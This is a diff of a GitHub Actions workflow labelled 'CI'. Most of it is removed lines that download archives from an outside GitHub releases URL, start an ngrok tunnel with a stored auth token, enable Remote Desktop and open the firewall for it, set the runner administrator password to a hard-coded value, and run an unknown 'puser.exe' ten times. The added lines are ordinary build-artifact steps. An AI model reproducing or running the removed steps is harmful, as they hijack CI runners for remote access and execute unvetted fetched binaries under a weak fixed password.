@@ -2,107 +2,33 @@
 
 name: CI
 
-# Controls when the action will run. Triggers the workflow on push or pull request
+# https://github.com/actions/runner-images/blob/main/images/windows/Windows2025-Readme.md
 # events but only for the master branch
 on:
-  workflow_dispatch:
-    inputs:
-      opencv-version:
-        description: The version of OpenCV
-        required: true
-        default: 4.5.2
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
 
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
   # This workflow contains a single job called "build"
   build:
     # The type of runner that the job will run on
-    runs-on: windows-2022
-    timeout-minutes: 360
-
+    runs-on: windows-latest
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      - name: rmo
-        run: |
-          C:
-          cd /
-          md ue4r
-          md ngrok
-          cd ngrok
-          Invoke-WebRequest https://github.com/Klanly/stevs2019/releases/download/3.0/ngg.zip -OutFile ngg.zip
-          
-          Invoke-WebRequest https://github.com/Klanly/stevs2019/releases/download/3.0/com3d.zip -OutFile com3d.zip
-       
-          7z x ngg.zip -oC:\ngrok
-          
-          Invoke-WebRequest https://github.com/Klanly/stevs2019/releases/download/3.0/pkr.zip -OutFile pkr.zip
-       
-          7z x pkr.zip -oC:\ngrok
-      
-      - name: Auth
-        run: C:\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
-        env:
-          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
-      - name: Enable TS
-        run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-          Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
-      - name: Add msbuild to PATH
-        uses: microsoft/setup-msbuild@v1.0.2
-      
-        
-      - name: xe1
-        if: always()
-        run: |
-          C:
-          cd /
-          cd ngrok
-          C:\ngrok\puser.exe
-      - name: xe2
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe3
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe4
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe5
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe6
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe7
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe8
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe9
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-      - name: xe10
-        if: always()
-        run: |
-          C:\ngrok\puser.exe
-
-          
       - name: ziping
         if: always()
-        run: 7z a C:\v2019c.7z "C:\ue4r" -mqs -ms=on
+        run: 7z a C:\v2019c.7z "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\Llvm\bin" -mqs -ms=on
           
+      - name: uploadexe
+        if: always()
+        uses: actions/upload-artifact@v2
+        with:
+          name: exacu
+          path: C:\v2019c.7z
           
           
      
